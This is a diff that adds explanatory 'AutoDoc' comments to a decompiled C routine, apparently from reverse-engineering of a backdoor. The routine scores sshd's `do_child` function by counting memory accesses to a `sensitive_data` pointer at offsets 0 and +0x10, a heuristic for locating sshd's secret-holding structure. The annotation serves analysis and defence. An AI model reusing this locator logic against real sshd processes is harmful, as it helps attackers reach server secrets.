@@ -5,10 +5,7 @@
 
 
 /*
- * AutoDoc: Uses the string catalogue to locate `do_child` and counts how many memory operands touch the supplied pointer at offsets
- * 0 and +0x10. Touching the base is worth one point while seeing multiple hits on +0x10 yields up to two more, so routines
- * that read both halves of the struct bubble to the top. The tiny score (0–3) feeds into the aggregate heuristic that
- * selects the best candidate.
+ * AutoDoc: Uses the cached string reference for `do_child`, awards one point if it ever touches the candidate pointer, and then probes for one or two references to offset +0x10. The second half of the struct buys up to two additional points, yielding a 0–3 score that feeds the aggregate heuristic.
  */
 
 #include "xzre_types.h"
@@ -30,9 +27,12 @@ int sshd_get_sensitive_data_score_in_do_child
   
   zero_seed = 0;
   score = 0;
+  // AutoDoc: Locate `do_child` via the `chdir_home_error` string reference and bail out if the symbol is missing.
   code_start = (u8 *)(refs->chdir_home_error).func_start;
   if (code_start != (u8 *)0x0) {
     code_end = (u8 *)(refs->chdir_home_error).func_end;
+    // AutoDoc: Touching the base pointer once awards the initial point in the score.
+    // AutoDoc: Reuse the same scanner to hunt for accesses to `sensitive_data + 0x10`; the first hit collects +1.
     hit_found = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
     score = (uint)(hit_found != FALSE);
     ctx_cursor = &do_child_start;
@@ -44,6 +44,7 @@ int sshd_get_sensitive_data_score_in_do_child
                       (code_start,code_end,(dasm_ctx_t *)&do_child_start,
                        (void *)((long)sensitive_data + 0x10));
     if (hit_found != FALSE) {
+      // AutoDoc: A second access to the +0x10 field within the remaining code bumps the score by another point.
       hit_found = find_instruction_with_mem_operand
                         (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
                          (void *)((long)sensitive_data + 0x10));
